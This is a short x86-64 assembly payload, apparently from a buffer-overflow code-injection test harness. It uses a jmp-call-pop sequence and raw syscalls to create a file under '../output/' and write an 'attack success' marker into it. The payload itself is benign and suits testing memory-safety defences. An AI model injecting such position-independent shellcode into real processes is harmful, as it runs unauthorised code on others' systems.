global _start
_start:
        jmp short FILENAME
GOBACK:
        mov rax, 2
        pop rdi
        mov rsi, 65
        mov rdx, 438
        syscall
        jmp short OUTPUT
GOBACK1:
        mov rdi, rax
	mov rax, 1
	pop rsi
	mov rdx, 56
	syscall
        mov rax, 60
        xor rdi, rdi
        syscall
FILENAME:
       call GOBACK
       db "../output/buffer_overflow_code_injection_write_file.txt",0x00
OUTPUT:
       call GOBACK1
       db "buffer_overflow_code_injection_write_file attack success",0x00

